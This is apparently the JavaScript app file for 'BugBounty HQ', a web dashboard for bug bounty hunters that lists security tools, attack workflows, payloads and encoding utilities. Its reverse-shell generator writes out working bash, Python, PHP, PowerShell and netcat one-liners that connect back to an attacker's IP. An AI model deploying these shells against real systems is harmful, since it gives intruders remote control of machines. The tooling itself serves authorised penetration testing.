/* ============================================================
   BugBounty HQ — app.js
   Main application logic
   ============================================================ */

'use strict';

/* ══════════════════════════════════════════
   PARTICLE BACKGROUND
   ══════════════════════════════════════════ */
(function initParticles() {
  const canvas = document.getElementById('particles-canvas');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  let W, H, particles = [];

  function resize() {
    W = canvas.width  = window.innerWidth;
    H = canvas.height = window.innerHeight;
  }
  resize();
  window.addEventListener('resize', resize);

  class Particle {
    constructor() { this.reset(); }
    reset() {
      this.x  = Math.random() * W;
      this.y  = Math.random() * H;
      this.vx = (Math.random() - 0.5) * 0.4;
      this.vy = (Math.random() - 0.5) * 0.4;
      this.r  = Math.random() * 2 + 0.5;
      this.alpha = Math.random() * 0.5 + 0.1;
      const palette = ['#4f8eff','#a855f7','#22d3ee','#22c55e'];
      this.color = palette[Math.floor(Math.random() * palette.length)];
    }
    update() {
      this.x += this.vx; this.y += this.vy;
      if (this.x < 0 || this.x > W || this.y < 0 || this.y > H) this.reset();
    }
    draw() {
      ctx.beginPath();
      ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
      ctx.fillStyle = this.color;
      ctx.globalAlpha = this.alpha;
      ctx.fill();
    }
  }

  for (let i = 0; i < 80; i++) particles.push(new Particle());

  function drawLines() {
    for (let i = 0; i < particles.length; i++) {
      for (let j = i + 1; j < particles.length; j++) {
        const dx = particles[i].x - particles[j].x;
        const dy = particles[i].y - particles[j].y;
        const dist = Math.sqrt(dx * dx + dy * dy);
        if (dist < 120) {
          ctx.beginPath();
          ctx.moveTo(particles[i].x, particles[i].y);
          ctx.lineTo(particles[j].x, particles[j].y);
          ctx.strokeStyle = 'rgba(79,142,255,' + (0.08 * (1 - dist / 120)) + ')';
          ctx.globalAlpha = 1;
          ctx.lineWidth = 0.5;
          ctx.stroke();
        }
      }
    }
  }

  function loop() {
    ctx.clearRect(0, 0, W, H);
    particles.forEach(p => { p.update(); p.draw(); });
    ctx.globalAlpha = 1;
    drawLines();
    requestAnimationFrame(loop);
  }
  loop();
})();

/* ══════════════════════════════════════════
   APP
   ══════════════════════════════════════════ */
const app = (() => {
  /* ── State ── */
  let currentSection = 'dashboard';
  let currentCategory = 'all';
  let searchQuery = '';

  /* ── Helpers ── */
  function $(id) { return document.getElementById(id); }
  function el(tag, cls, html) {
    const e = document.createElement(tag);
    if (cls)  e.className = cls;
    if (html) e.innerHTML = html;
    return e;
  }
  function getCatCls(cat) {
    return (CATEGORIES[cat] || {}).cls || 'cat-misc';
  }
  function getCatIcon(cat) {
    return (CATEGORIES[cat] || {}).icon || '⚙️';
  }
  function sanitize(s) {
    return String(s).replace(/</g, '&lt;').replace(/>/g, '&gt;');
  }

  /* ── Toast ── */
  function showToast(msg = '✓ Copied!') {
    const t = $('toast');
    t.textContent = msg;
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 2000);
  }

  function copyText(text) {
    navigator.clipboard.writeText(text).then(() => showToast('✓ Copied!')).catch(() => {
      const ta = document.createElement('textarea');
      ta.value = text; document.body.appendChild(ta);
      ta.select(); document.execCommand('copy');
      ta.remove(); showToast('✓ Copied!');
    });
  }

  /* ══════════════════════════════════════════
     SIDEBAR
     ══════════════════════════════════════════ */
  function buildSidebar() {
    const nav = $('sidebar-nav');
    if (!nav) return;
    nav.innerHTML = '';

    const groups = [
      { label: 'Navigation', items: [
        { id: 'dashboard', icon: '🏠', label: 'Dashboard' },
        { id: 'tools',     icon: '🛠️', label: 'All Tools', count: TOOLS.length },
        { id: 'workflows', icon: '⚡', label: 'Workflows',  count: WORKFLOWS.length },
        { id: 'utilities', icon: '🔧', label: 'Utilities' },
        { id: 'payloads',  icon: '💣', label: 'Payloads',   count: Object.keys(PAYLOADS).length },
      ]},
      { label: 'Categories', items:
        Object.entries(CATEGORIES).map(([k, v]) => ({
          id: 'cat_' + k,
          icon: v.icon,
          label: v.label,
          count: TOOLS.filter(t => t.cat === k).length,
          action: () => { navigate('tools'); filterByCategory(k); }
        }))
      },
    ];

    groups.forEach(g => {
      const grpLabel = el('div', 'nav-group-label', g.label);
      const grp = el('div', 'nav-group');
      grp.appendChild(grpLabel);
      g.items.forEach(item => {
        const ni = el('div', 'nav-item' + (item.id === currentSection ? ' active' : ''));
        ni.dataset.id = item.id;
        ni.innerHTML = `<span class="nav-icon">${item.icon}</span>
          <span>${item.label}</span>
          ${item.count !== undefined ? `<span class="nav-count">${item.count}</span>` : ''}`;
        ni.addEventListener('click', () => {
          if (item.action) { item.action(); }
          else { navigate(item.id); }
          // Close sidebar on mobile
          document.getElementById('sidebar').classList.remove('open');
        });
        grp.appendChild(ni);
      });
      nav.appendChild(grp);
    });

    // Sidebar filter
    const sSearch = $('sidebar-search');
    if (sSearch) {
      sSearch.addEventListener('input', () => {
        const q = sSearch.value.toLowerCase();
        nav.querySelectorAll('.nav-item').forEach(ni => {
          ni.style.display = ni.textContent.toLowerCase().includes(q) ? '' : 'none';
        });
      });
    }
  }

  function setActiveNav(sectionId) {
    document.querySelectorAll('.nav-item').forEach(ni => {
      ni.classList.toggle('active', ni.dataset.id === sectionId);
    });
  }

  /* ══════════════════════════════════════════
     NAVIGATION
     ══════════════════════════════════════════ */
  function navigate(sectionId) {
    const pages = ['dashboard','tools','workflows','utilities','payloads'];
    const target = pages.includes(sectionId) ? sectionId : 'tools';

    document.querySelectorAll('.page-section').forEach(s => s.classList.remove('active'));
    const sec = $('section-' + target);
    if (sec) sec.classList.add('active');

    currentSection = target;
    setActiveNav(target);

    const titles = {
      dashboard: '🏠 Dashboard', tools: '🛠️ All Tools',
      workflows: '⚡ Workflows', utilities: '🔧 Utilities', payloads: '💣 Payloads'
    };
    const tb = $('topbar-title');
    if (tb) tb.textContent = titles[target] || target;

    // Lazy render
    renderSection(target);
  }

  function renderSection(id) {
    const renderers = {
      dashboard: renderDashboard,
      tools:     renderTools,
      workflows: renderWorkflows,
      utilities: renderUtilities,
      payloads:  renderPayloads,
    };
    if (renderers[id]) renderers[id]();
  }

  /* ══════════════════════════════════════════
     DASHBOARD
     ══════════════════════════════════════════ */
  function renderDashboard() {
    const sec = $('section-dashboard');
    if (!sec || sec.dataset.rendered) return;
    sec.dataset.rendered = '1';

    const catCounts = {};
    TOOLS.forEach(t => { catCounts[t.cat] = (catCounts[t.cat] || 0) + 1; });

    // Hero
    const hero = el('div', 'hero-banner');
    hero.innerHTML = `
      <h1>🛡️ BugBounty HQ</h1>
      <p>Your unified command center for offensive security research. Search, filter, generate commands, and execute pre-built attack workflows — all in one place.</p>
      <div class="hero-stats">
        <div class="hero-stat"><div class="hero-stat-num">${TOOLS.length}+</div><div class="hero-stat-lbl">Security Tools</div></div>
        <div class="hero-stat"><div class="hero-stat-num">${Object.keys(CATEGORIES).length}</div><div class="hero-stat-lbl">Categories</div></div>
        <div class="hero-stat"><div class="hero-stat-num">${WORKFLOWS.length}</div><div class="hero-stat-lbl">Workflows</div></div>
        <div class="hero-stat"><div class="hero-stat-num">${Object.keys(PAYLOADS).length}</div><div class="hero-stat-lbl">Payload Sets</div></div>
      </div>`;

    // Stats grid
    const statsGrid = el('div', 'stats-grid');
    Object.entries(CATEGORIES).forEach(([k, v]) => {
      const card = el('div', 'stat-card');
      card.style.cursor = 'pointer';
      card.innerHTML = `<div class="stat-card-icon">${v.icon}</div>
        <div class="stat-card-num">${catCounts[k] || 0}</div>
        <div class="stat-card-lbl">${v.label}</div>`;
      card.addEventListener('click', () => { navigate('tools'); filterByCategory(k); });
      statsGrid.appendChild(card);
    });

    // Quick access
    const quickTitle = el('h2', '', '⚡ Quick Access');
    quickTitle.style.cssText = 'font-size:16px;font-weight:700;margin-bottom:12px;color:var(--text-primary)';
    const quickGrid = el('div', 'quick-grid');
    const quickItems = [
      { icon:'🔭', cls:'cat-recon',   name:'Start Recon',     desc:'Full subdomain & endpoint discovery', action:() => { navigate('workflows'); } },
      { icon:'💣', cls:'cat-exploit', name:'Payload Library',  desc:'XSS, SQLi, SSTI, SSRF, LFI payloads', action:() => navigate('payloads') },
      { icon:'🔧', cls:'cat-web',     name:'Utilities',        desc:'Encode/decode, hash, reverse shell', action:() => navigate('utilities') },
      { icon:'⚡', cls:'cat-misc',    name:'Command Center',   desc:'Generate tool commands instantly', action:() => openCommandCenter() },
      { icon:'🌐', cls:'cat-web',     name:'Web App Tools',    desc:`${catCounts['web']||0} tools for web pentesting`, action:() => { navigate('tools'); filterByCategory('web'); } },
      { icon:'☁️', cls:'cat-cloud',   name:'Cloud Security',   desc:`${catCounts['cloud']||0} tools for cloud auditing`, action:() => { navigate('tools'); filterByCategory('cloud'); } },
    ];
    quickItems.forEach(qi => {
      const qc = el('div', 'quick-card');
      qc.innerHTML = `<div class="tool-icon ${qi.cls}" style="width:44px;height:44px;font-size:20px;">${qi.icon}</div>
        <div class="quick-card-info"><div class="name">${qi.name}</div><div class="desc">${qi.desc}</div></div>`;
      qc.addEventListener('click', qi.action);
      quickGrid.appendChild(qc);
    });

    sec.innerHTML = '';
    sec.appendChild(hero);
    sec.appendChild(statsGrid);
    sec.appendChild(quickTitle);
    sec.appendChild(quickGrid);
  }

  /* ══════════════════════════════════════════
     TOOLS SECTION
     ══════════════════════════════════════════ */
  function filterByCategory(cat) {
    currentCategory = cat;
    renderTools(true);
    // Update filter chips
    document.querySelectorAll('.filter-chip').forEach(c => {
      c.classList.toggle('active', c.dataset.cat === cat);
    });
  }

  function renderTools(force) {
    const sec = $('section-tools');
    if (!sec) return;

    // Build skeleton on first render
    if (!sec.dataset.rendered || force) {
      sec.dataset.rendered = '1';
      const header = el('div', 'section-header');
      header.innerHTML = `<div>
        <h2>🛠️ Security Tools</h2>
        <p>${TOOLS.length}+ tools across ${Object.keys(CATEGORIES).length} categories</p></div>`;

      // Filters
      const filters = el('div', 'filters-bar');
      const allChip = el('div', `filter-chip${currentCategory === 'all' ? ' active' : ''}`);
      allChip.textContent = 'All'; allChip.dataset.cat = 'all';
      allChip.addEventListener('click', () => filterByCategory('all'));
      filters.appendChild(allChip);

      Object.entries(CATEGORIES).forEach(([k, v]) => {
        const chip = el('div', `filter-chip${currentCategory === k ? ' active' : ''}`);
        chip.textContent = v.icon + ' ' + v.label; chip.dataset.cat = k;
        chip.addEventListener('click', () => filterByCategory(k));
        filters.appendChild(chip);
      });

      const grid = el('div', 'tools-grid'); grid.id = 'tools-grid';

      sec.innerHTML = '';
      sec.appendChild(header);
      sec.appendChild(filters);
      sec.appendChild(grid);
    }

    populateToolsGrid();
  }

  function populateToolsGrid() {
    const grid = $('tools-grid');
    if (!grid) return;
    grid.innerHTML = '';

    const filtered = TOOLS.filter(t => {
      const matchCat = currentCategory === 'all' || t.cat === currentCategory;
      const q = searchQuery.toLowerCase();
      const matchSearch = !q ||
        t.name.toLowerCase().includes(q) ||
        t.desc.toLowerCase().includes(q) ||
        t.tags.some(tag => tag.includes(q)) ||
        t.cat.includes(q);
      return matchCat && matchSearch;
    });

    if (filtered.length === 0) {
      grid.innerHTML = `<div class="empty-state" style="grid-column:1/-1">
        <div class="icon">🔍</div>
        <h3>No tools found</h3>
        <p>Try adjusting your search or category filter</p></div>`;
      return;
    }

    filtered.forEach(tool => {
      const card = el('div', 'tool-card');
      card.innerHTML = `
        <div class="tool-card-header">
          <div class="tool-icon ${getCatCls(tool.cat)}">${getCatIcon(tool.cat)}</div>
          <div>
            <div class="tool-card-name">${sanitize(tool.name)}</div>
            <div class="tool-card-cat">${(CATEGORIES[tool.cat]||{}).label||tool.cat}</div>
          </div>
        </div>
        <div class="tool-card-desc">${sanitize(tool.desc)}</div>
        <div class="tool-card-tags">${tool.tags.map(t => `<span class="tag">${sanitize(t)}</span>`).join('')}</div>
        <div class="tool-card-footer">
          <span class="tool-lang mono">${sanitize(tool.lang)}</span>
          <div class="tool-actions">
            <button class="btn btn-sm btn-ghost" onclick="app.copyCmd(event,'${tool.id}')">📋 Copy</button>
            <button class="btn btn-sm btn-primary" onclick="app.openTool('${tool.id}')">Details →</button>
          </div>
        </div>`;
      grid.appendChild(card);
    });
  }

  function copyCmd(e, toolId) {
    e.stopPropagation();
    const tool = TOOLS.find(t => t.id === toolId);
    if (tool) copyText(tool.cmd);
  }

  /* ══════════════════════════════════════════
     TOOL DETAIL MODAL
     ══════════════════════════════════════════ */
  function openTool(toolId) {
    const tool = TOOLS.find(t => t.id === toolId);
    if (!tool) return;

    $('modal-tool-name').textContent = tool.name;
    const body = $('modal-body');
    body.innerHTML = `
      <div class="detail-section">
        <h3>Description</h3>
        <div class="detail-desc">${sanitize(tool.desc)}</div>
      </div>

      <div class="detail-section">
        <h3>Tags</h3>
        <div class="detail-tags">${tool.tags.map(t => `<span class="tag" style="font-size:12px;padding:4px 10px">${sanitize(t)}</span>`).join('')}</div>
      </div>

      <div class="detail-section">
        <h3>Installation</h3>
        <div class="code-block">${sanitize(tool.install || 'See documentation')}
          <button class="copy-btn" onclick="app.copyText(${JSON.stringify(tool.install||'')})">Copy</button></div>
      </div>

      <div class="detail-section">
        <h3>Example Command</h3>
        <div class="code-block">${sanitize(tool.cmd)}
          <button class="copy-btn" onclick="app.copyText(${JSON.stringify(tool.cmd)})">Copy</button></div>
      </div>

      ${tool.cmd2 ? `<div class="detail-section">
        <h3>Additional Command</h3>
        <div class="code-block">${sanitize(tool.cmd2)}
          <button class="copy-btn" onclick="app.copyText(${JSON.stringify(tool.cmd2)})">Copy</button></div>
      </div>` : ''}

      <div class="detail-section">
        <h3>Language / Platform</h3>
        <div class="detail-desc mono" style="color:var(--accent-cyan)">${sanitize(tool.lang)}</div>
      </div>

      <div class="detail-section">
        <h3>Links</h3>
        <div class="detail-links">
          ${tool.url ? `<a class="detail-link" href="${sanitize(tool.url)}" target="_blank" rel="noopener">🌐 Website</a>` : ''}
          ${tool.github ? `<a class="detail-link" href="${sanitize(tool.github)}" target="_blank" rel="noopener">🔗 GitHub</a>` : ''}
        </div>
      </div>`;

    document.getElementById('modal-overlay').classList.add('open');
    document.getElementById('modal-overlay').onclick = function(e) {
      if (e.target === this) closeModal();
    };
  }

  function closeModal() {
    document.getElementById('modal-overlay').classList.remove('open');
  }

  /* ══════════════════════════════════════════
     WORKFLOWS
     ══════════════════════════════════════════ */
  function renderWorkflows() {
    const sec = $('section-workflows');
    if (!sec || sec.dataset.rendered) return;
    sec.dataset.rendered = '1';

    const header = el('div', 'section-header');
    header.innerHTML = `<div>
      <h2>⚡ Attack Workflows</h2>
      <p>Pre-built attack chains for common bug bounty scenarios</p></div>`;

    const grid = el('div', 'workflows-grid');

    WORKFLOWS.forEach(wf => {
      const card = el('div', 'workflow-card');
      const stepsHtml = wf.steps.map((s, i) => `
        <div class="workflow-step">
          <div class="step-num">${i+1}</div>
          <div>
            <div class="step-tool">${sanitize(s.tool)}</div>
            <div class="step-cmd">${sanitize(s.cmd)}</div>
          </div>
        </div>`).join('');

      card.innerHTML = `
        <div class="workflow-header">
          <h3>${sanitize(wf.title)}</h3>
          <p>${sanitize(wf.desc)}</p>
        </div>
        <div class="workflow-steps">${stepsHtml}</div>
        <div class="workflow-footer">
          <button class="btn btn-sm btn-ghost" onclick="app.copyWorkflow('${wf.id}')">📋 Copy All</button>
          <button class="btn btn-sm btn-primary" onclick="app.runWorkflow('${wf.id}')">▶ Run Workflow</button>
        </div>`;
      grid.appendChild(card);
    });

    sec.innerHTML = '';
    sec.appendChild(header);
    sec.appendChild(grid);
  }

  function copyWorkflow(wfId) {
    const wf = WORKFLOWS.find(w => w.id === wfId);
    if (!wf) return;
    const text = wf.steps.map((s, i) => `# Step ${i+1}: ${s.tool}\n${s.cmd}`).join('\n\n');
    copyText(text);
  }

  function runWorkflow(wfId) {
    const wf = WORKFLOWS.find(w => w.id === wfId);
    if (!wf) return;
    const body = $('cc-body');
    const overlay = $('cc-overlay');

    body.innerHTML = `
      <div class="mb-16">
        <h3 style="font-size:16px;font-weight:700;margin-bottom:4px">${sanitize(wf.title)}</h3>
        <p style="font-size:12px;color:var(--text-muted)">${sanitize(wf.desc)}</p>
      </div>
      <div class="cc-form">
        <label>🎯 Target Domain / IP</label>
        <div class="cc-row">
          <input id="wf-target" class="util-input" placeholder="example.com or 192.168.1.1" style="flex:1">
          <input id="wf-attacker" class="util-input" placeholder="Your IP (optional)" style="flex:1">
        </div>
      </div>
      <div id="wf-cmds"></div>
      <button class="btn btn-primary" onclick="app.generateWorkflowCmds('${wfId}')">⚡ Generate Commands</button>`;

    overlay.classList.add('open');
  }

  function generateWorkflowCmds(wfId) {
    const wf = WORKFLOWS.find(w => w.id === wfId);
    if (!wf) return;
    const target = ($('wf-target').value || '{domain}').trim();
    const attacker = ($('wf-attacker').value || '{attacker}').trim();
    const container = $('wf-cmds');
    container.innerHTML = `<div style="margin:16px 0 8px;font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--text-muted)">Generated Commands</div>`;

    wf.steps.forEach((s, i) => {
      const cmd = s.cmd.replace(/\{domain\}/g, target).replace(/\{target\}/g, target).replace(/\{attacker\}/g, attacker);
      const div = el('div', 'mb-8');
      div.innerHTML = `<div style="font-size:11px;color:var(--accent-blue);margin-bottom:4px">Step ${i+1} — ${sanitize(s.tool)}</div>
        <div class="code-block" style="font-size:11px">${sanitize(cmd)}
          <button class="copy-btn" onclick="app.copyText(${JSON.stringify(cmd)})">Copy</button></div>`;
      container.appendChild(div);
    });

    const allCmd = wf.steps.map(s => s.cmd.replace(/\{domain\}/g, target).replace(/\{target\}/g, target).replace(/\{attacker\}/g, attacker)).join('\n');
    const copyAll = el('button', 'btn btn-ghost', '📋 Copy All Commands');
    copyAll.style.marginTop = '12px';
    copyAll.addEventListener('click', () => copyText(allCmd));
    container.appendChild(copyAll);
  }

  /* ══════════════════════════════════════════
     UTILITIES
     ══════════════════════════════════════════ */
  function renderUtilities() {
    const sec = $('section-utilities');
    if (!sec || sec.dataset.rendered) return;
    sec.dataset.rendered = '1';

    const header = el('div', 'section-header');
    header.innerHTML = `<div>
      <h2>🔧 Utilities</h2>
      <p>Encoding, hashing, reverse shell generators, and more</p></div>`;

    const grid = el('div', 'utils-grid');

    const utils = [
      {
        title: '🔐 Base64 Encode / Decode',
        desc: 'Encode or decode Base64 strings',
        html: `<textarea class="util-input" id="b64-in" placeholder="Enter text here..."></textarea>
          <div class="util-actions">
            <button class="btn btn-sm btn-primary" onclick="app.b64Encode()">Encode</button>
            <button class="btn btn-sm btn-ghost"  onclick="app.b64Decode()">Decode</button>
            <button class="btn btn-sm btn-ghost"  onclick="app.copyText(document.getElementById('b64-out').textContent)">📋 Copy</button>
          </div>
          <div class="util-output" id="b64-out">Output will appear here...</div>`
      },
      {
        title: '🔗 URL Encode / Decode',
        desc: 'Encode or decode URL-encoded strings',
        html: `<textarea class="util-input" id="url-in" placeholder="Enter text here..."></textarea>
          <div class="util-actions">
            <button class="btn btn-sm btn-primary" onclick="app.urlEncode()">Encode</button>
            <button class="btn btn-sm btn-ghost"  onclick="app.urlDecode()">Decode</button>
            <button class="btn btn-sm btn-ghost"  onclick="app.copyText(document.getElementById('url-out').textContent)">📋 Copy</button>
          </div>
          <div class="util-output" id="url-out">Output will appear here...</div>`
      },
      {
        title: '🔒 Hash Generator',
        desc: 'Generate MD5, SHA-1, SHA-256 hashes',
        html: `<input class="util-input" id="hash-in" placeholder="Enter text to hash...">
          <div class="util-actions">
            <button class="btn btn-sm btn-primary" onclick="app.computeHash('SHA-256','hash-out')">SHA-256</button>
            <button class="btn btn-sm btn-ghost"  onclick="app.computeHash('SHA-1','hash-out')">SHA-1</button>
            <button class="btn btn-sm btn-ghost"  onclick="app.computeHash('SHA-512','hash-out')">SHA-512</button>
          </div>
          <div class="util-output mono" id="hash-out">Hash output here...</div>`
      },
      {
        title: '🖥️ Reverse Shell Generator',
        desc: 'Generate reverse shell one-liners for multiple languages',
        html: `<input class="util-input" id="rs-ip" placeholder="Your IP (e.g. 10.10.10.1)">
          <input class="util-input" id="rs-port" placeholder="Port (e.g. 4444)" style="margin-top:6px">
          <div class="util-actions">
            <button class="btn btn-sm btn-primary" onclick="app.genRevShell('bash')">Bash</button>
            <button class="btn btn-sm btn-ghost"  onclick="app.genRevShell('python')">Python</button>
            <button class="btn btn-sm btn-ghost"  onclick="app.genRevShell('php')">PHP</button>
            <button class="btn btn-sm btn-ghost"  onclick="app.genRevShell('powershell')">PS</button>
            <button class="btn btn-sm btn-ghost"  onclick="app.genRevShell('nc')">Netcat</button>
          </div>
          <div class="util-output mono" id="rs-out">Shell will appear here...</div>`
      },
      {
        title: '🌐 IP / CIDR Calculator',
        desc: 'Calculate CIDR range, first/last IP, and total hosts',
        html: `<input class="util-input" id="cidr-in" placeholder="e.g. 192.168.1.0/24">
          <div class="util-actions">
            <button class="btn btn-sm btn-primary" onclick="app.calcCIDR()">Calculate</button>
          </div>
          <div class="util-output" id="cidr-out">Results will appear here...</div>`
      },
      {
        title: '🔑 JWT Decoder',
        desc: 'Decode and inspect JWT tokens (client-side)',
        html: `<textarea class="util-input" id="jwt-in" placeholder="Paste JWT token here..." style="height:70px"></textarea>
          <div class="util-actions">
            <button class="btn btn-sm btn-primary" onclick="app.decodeJWT()">Decode</button>
          </div>
          <div class="util-output" id="jwt-out" style="min-height:80px">Decoded JWT here...</div>`
      },
      {
        title: '📝 HTML Entity Encode',
        desc: 'Encode special characters to HTML entities',
        html: `<textarea class="util-input" id="html-in" placeholder="<script>alert(1)</script>"></textarea>
          <div class="util-actions">
            <button class="btn btn-sm btn-primary" onclick="app.htmlEncode()">Encode</button>
            <button class="btn btn-sm btn-ghost"  onclick="app.htmlDecode()">Decode</button>
            <button class="btn btn-sm btn-ghost"  onclick="app.copyText(document.getElementById('html-out').textContent)">📋 Copy</button>
          </div>
          <div class="util-output" id="html-out">Output here...</div>`
      },
      {
        title: '🎲 Random String Generator',
        desc: 'Generate random strings for payloads and tokens',
        html: `<div class="cc-row">
            <input class="util-input" id="rng-len" placeholder="Length (default 32)" style="margin-bottom:0">
            <select class="util-input" id="rng-type" style="margin-bottom:0">
              <option value="hex">Hex</option>
              <option value="alpha">Alphanumeric</option>
              <option value="upper">Uppercase</option>
              <option value="symbols">With Symbols</option>
            </select>
          </div>
          <div class="util-actions">
            <button class="btn btn-sm btn-primary" onclick="app.genRandom()">Generate</button>
            <button class="btn btn-sm btn-ghost"  onclick="app.copyText(document.getElementById('rng-out').textContent)">📋 Copy</button>
          </div>
          <div class="util-output mono" id="rng-out">Random string here...</div>`
      },
    ];

    utils.forEach(u => {
      const card = el('div', 'util-card');
      card.innerHTML = `<h3>${u.title}</h3><p>${u.desc}</p>${u.html}`;
      grid.appendChild(card);
    });

    sec.innerHTML = '';
    sec.appendChild(header);
    sec.appendChild(grid);
  }

  /* Utility functions */
  function b64Encode() {
    try { $('b64-out').textContent = btoa(unescape(encodeURIComponent($('b64-in').value))); }
    catch(e) { $('b64-out').textContent = 'Error: ' + e.message; }
  }
  function b64Decode() {
    try { $('b64-out').textContent = decodeURIComponent(escape(atob($('b64-in').value))); }
    catch(e) { $('b64-out').textContent = 'Error: Invalid Base64'; }
  }
  function urlEncode() { $('url-out').textContent = encodeURIComponent($('url-in').value); }
  function urlDecode() {
    try { $('url-out').textContent = decodeURIComponent($('url-in').value); }
    catch(e) { $('url-out').textContent = 'Error: Invalid URL encoding'; }
  }

  async function computeHash(algo, outId) {
    const text = $('hash-in').value;
    if (!text) { $(outId).textContent = 'Enter text first'; return; }
    const enc = new TextEncoder().encode(text);
    const buf = await crypto.subtle.digest(algo, enc);
    const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
    $(outId).textContent = algo + ': ' + hex;
  }

  function genRevShell(type) {
    const ip   = $('rs-ip').value   || 'YOUR_IP';
    const port = $('rs-port').value || '4444';
    const shells = {
      bash:       `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
      python:     `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`,
      php:        `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
      powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
      nc:         `nc -e /bin/bash ${ip} ${port}\n# OR:\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ${ip} ${port} > /tmp/f`,
    };
    $('rs-out').textContent = shells[type] || '';
  }

  function calcCIDR() {
    const val = $('cidr-in').value.trim();
    const out = $('cidr-out');
    try {
      const [ip, bits] = val.split('/');
      const mask = bits ? parseInt(bits) : 32;
      if (mask < 0 || mask > 32 || !ip) throw new Error('Invalid');
      const parts = ip.split('.').map(Number);
      if (parts.length !== 4 || parts.some(p => p < 0 || p > 255)) throw new Error('Invalid IP');
      const ipInt = (parts[0]<<24)|(parts[1]<<16)|(parts[2]<<8)|parts[3];
      const maskInt = mask === 0 ? 0 : (~0 << (32 - mask)) >>> 0;
      const netInt = (ipInt & maskInt) >>> 0;
      const bcastInt = (netInt | (~maskInt >>> 0)) >>> 0;
      const toIP = n => [(n>>>24)&255,(n>>>16)&255,(n>>>8)&255,n&255].join('.');
      const total = Math.pow(2, 32 - mask);
      out.textContent = `Network:   ${toIP(netInt)}/${mask}\nBroadcast: ${toIP(bcastInt)}\nFirst Host:${toIP(netInt+1)}\nLast Host: ${toIP(bcastInt-1)}\nTotal IPs: ${total.toLocaleString()}\nUsable:    ${Math.max(0,total-2).toLocaleString()}`;
    } catch { out.textContent = 'Invalid CIDR notation. Example: 192.168.1.0/24'; }
  }

  function decodeJWT() {
    const token = $('jwt-in').value.trim();
    const out = $('jwt-out');
    try {
      const parts = token.split('.');
      if (parts.length !== 3) throw new Error('Not a valid JWT (must have 3 parts)');
      const decode = b64 => JSON.parse(atob(b64.replace(/-/g,'+').replace(/_/g,'/')));
      const header  = decode(parts[0]);
      const payload = decode(parts[1]);
      out.textContent = '── Header ──\n' + JSON.stringify(header, null, 2) + '\n\n── Payload ──\n' + JSON.stringify(payload, null, 2) + '\n\n── Signature ──\n' + parts[2];
    } catch(e) { out.textContent = 'Error: ' + e.message; }
  }

  function htmlEncode() {
    const map = {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'};
    $('html-out').textContent = $('html-in').value.replace(/[&<>"']/g, c => map[c]);
  }
  function htmlDecode() {
    const d = document.createElement('div');
    d.innerHTML = $('html-in').value;
    $('html-out').textContent = d.textContent;
  }

  function genRandom() {
    const len = parseInt($('rng-len').value) || 32;
    const type = $('rng-type').value;
    const chars = {
      hex:     '0123456789abcdef',
      alpha:   '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
      upper:   'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
      symbols: '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+-=[]{}|;:,.<>?',
    }[type] || 'abcdef0123456789';
    let result = '';
    const arr = new Uint8Array(len);
    crypto.getRandomValues(arr);
    arr.forEach(b => result += chars[b % chars.length]);
    $('rng-out').textContent = result;
  }

  /* ══════════════════════════════════════════
     PAYLOADS
     ══════════════════════════════════════════ */
  function renderPayloads() {
    const sec = $('section-payloads');
    if (!sec || sec.dataset.rendered) return;
    sec.dataset.rendered = '1';

    const header = el('div', 'section-header');
    header.innerHTML = `<div>
      <h2>💣 Payload Library</h2>
      <p>Click any payload to copy it instantly</p></div>`;

    sec.innerHTML = '';
    sec.appendChild(header);

    Object.entries(PAYLOADS).forEach(([cat, items]) => {
      const section = el('div', 'payload-section');
      const h3 = el('h3', '', sanitize(cat));
      const grid = el('div', 'payload-grid');
      items.forEach(p => {
        const item = el('div', 'payload-item');
        item.innerHTML = `<span style="flex:1;word-break:break-all">${sanitize(p)}</span><span class="copy-icon">📋</span>`;
        item.addEventListener('click', () => copyText(p));
        item.title = 'Click to copy';
        grid.appendChild(item);
      });
      section.appendChild(h3);
      section.appendChild(grid);
      sec.appendChild(section);
    });
  }

  /* ══════════════════════════════════════════
     COMMAND CENTER
     ══════════════════════════════════════════ */
  function openCommandCenter() {
    const overlay = $('cc-overlay');
    const body = $('cc-body');

    body.innerHTML = `
      <div class="cc-form">
        <label>🎯 Target (domain or IP)</label>
        <input id="cc-target" class="util-input" placeholder="example.com or 192.168.1.1">
      </div>
      <div style="font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--text-muted);margin-bottom:10px">Popular Tools — Click to generate command</div>
      <div class="cc-grid" id="cc-tools-grid"></div>`;

    const grid = $('cc-tools-grid');
    const popular = TOOLS.slice(0, 18);
    popular.forEach(tool => {
      const item = el('div', 'cc-item');
      item.innerHTML = `<div class="tool">${sanitize(tool.name)}</div>
        <div class="cmd">${sanitize(tool.cmd.substring(0, 60))}${tool.cmd.length > 60 ? '...' : ''}</div>`;
      item.addEventListener('click', () => {
        const target = $('cc-target').value || '{target}';
        const cmd = tool.cmd.replace(/\{target\}/g, target).replace(/\{domain\}/g, target);
        copyText(cmd);
        showToast(`✓ Copied ${tool.name} command!`);
      });
      grid.appendChild(item);
    });

